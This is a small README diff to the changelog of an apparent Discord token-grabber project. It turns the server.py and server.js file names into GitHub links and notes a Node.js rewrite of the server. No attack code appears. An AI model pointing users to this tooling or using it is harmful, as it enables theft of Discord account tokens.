@@ -6,7 +6,7 @@
 
 ## Logs
 
-**July 14, 2023**: Updated server. Rewrote `server.py` in Node.js as `server.js` for those who prefer using Node.js instead of Python.
+**July 14, 2023**: Updated server. Rewrote [`server.py`](https://github.com/I-Skid/discord-web-token-grabber/blob/main/server.py) in Node.js as [`server.js`](https://github.com/I-Skid/discord-web-token-grabber/blob/main/server.js) for those who prefer using Node.js instead of Python.
 
 ## Platforms
 
